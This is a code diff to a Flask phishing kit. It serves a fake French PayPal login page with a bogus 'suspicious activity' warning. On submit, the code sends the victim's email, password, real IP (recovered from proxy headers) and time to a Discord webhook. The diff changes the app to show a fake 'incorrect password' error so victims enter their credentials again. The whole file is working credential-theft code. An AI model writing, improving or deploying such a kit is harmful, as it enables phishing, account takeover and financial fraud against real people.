@@ -1,4 +1,5 @@
 import os
+import re
 from flask import Flask, request, render_template_string, redirect
 import requests
 import datetime
@@ -6,7 +7,20 @@ import datetime
 app = Flask(__name__)
 DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')
 
-PAGE = """
+# Fonction pour récupérer la vraie IP (même derrière un proxy)
+def get_real_ip():
+    # Check Cloudflare
+    cf_ip = request.headers.get('CF-Connecting-IP')
+    if cf_ip:
+        return cf_ip
+    # Check X-Forwarded-For (Render, etc.)
+    xff = request.headers.get('X-Forwarded-For')
+    if xff:
+        return xff.split(',')[0].strip()
+    return request.remote_addr
+
+# Page HTML (avec emplacement pour le message d'erreur)
+PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal</title>
@@ -37,6 +51,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
 .secure{text-align:center;margin-top:20px;font-size:12px;color:#737373}
 .footer{margin-top:24px;text-align:center;font-size:11px;color:#737373}
 .footer a{color:#737373;text-decoration:none;margin:0 5px}
+.error{background:#fde8e8;border:1px solid #f5c6c6;border-radius:6px;padding:10px 14px;color:#c62828;font-size:13px;text-align:center;margin-bottom:16px;display:{% if error %}block{% else %}none{% endif %}}
 </style>
 </head>
 <body>
@@ -45,6 +60,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
 <h1 class=title>Connexion</h1>
 <p class=subtitle>Accédez à votre compte PayPal</p>
 <div class=alert><div class=alert-content><strong>⚠️ Activité suspecte</strong><p>Un paiement non autorisé a été bloqué. Vérifiez votre identité.</p></div></div>
+<div class="error">❌ Email ou mot de passe incorrect. Veuillez réessayer.</div>
 <form method=POST action=/login>
 <div class=form-group><label class=form-label>Email</label><input type=email name=email class=form-input placeholder=exemple@email.com required></div>
 <div class=form-group><label class=form-label>Mot de passe</label><input type=password name=password class=form-input placeholder=•••••••• required></div>
@@ -62,12 +78,18 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
 
 @app.route('/')
 def home():
-    return PAGE
+    # Affiche la page sans erreur
+    return render_template_string(PAGE_TEMPLATE, error=False)
 
 @app.route('/login', methods=['POST'])
 def login():
     email = request.form.get('email', '')
     password = request.form.get('password', '')
+    
+    # Récupère la vraie IP
+    ip = get_real_ip()
+    
+    # Envoie à Discord
     if DISCORD_WEBHOOK:
         payload = {
             'content': '🔐 **NOUVEAUX IDENTIFIANTS**',
@@ -75,18 +97,21 @@ def login():
                 'title': 'PayPal',
                 'color': 0x0070ba,
                 'fields': [
-                    {'name': 'Email', 'value': email},
-                    {'name': 'Mot de passe', 'value': password},
-                    {'name': 'IP', 'value': request.remote_addr}
+                    {'name': '📧 Email', 'value': email, 'inline': False},
+                    {'name': '🔑 Mot de passe', 'value': password, 'inline': False},
+                    {'name': '🌐 IP', 'value': ip, 'inline': True},
+                    {'name': '🕒 Heure', 'value': datetime.datetime.now().strftime('%H:%M:%S'), 'inline': True}
                 ],
-                'footer': {'text': datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
+                'footer': {'text': datetime.datetime.now().strftime('%d/%m/%Y')}
             }]
         }
         try:
-            requests.post(DISCORD_WEBHOOK, json=payload)
+            requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
         except:
             pass
-    return redirect('https://www.paypal.com')
+    
+    # Simule un échec de connexion : affiche la page avec erreur
+    return render_template_string(PAGE_TEMPLATE, error=True)
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
